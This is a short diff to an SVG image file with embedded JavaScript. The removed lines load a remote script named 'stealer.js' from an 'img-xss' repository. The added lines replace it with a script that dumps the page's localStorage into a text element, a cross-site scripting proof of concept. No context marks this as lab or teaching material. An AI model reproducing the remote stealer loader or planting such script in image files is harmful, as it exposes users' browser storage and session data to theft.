@@ -1,9 +1,12 @@
 <svg xmlns="http://www.w3.org/2000/svg">
+  <text x="10" y="50" font-size="20">
+    <![CDATA[
+      document.querySelector("text").textContent = JSON.stringify(localStorage);
+    ]]>
+  </text>
   <script>
     <![CDATA[
-      let s = document.createElement("script");
-      s.src = "https://raw.githubusercontent.com/B6G-K1LLER/img-xss/main/stealer.js";
-      document.body.appendChild(s);
+      document.querySelector("text").textContent = JSON.stringify(localStorage);
     ]]>
   </script>
 </svg>
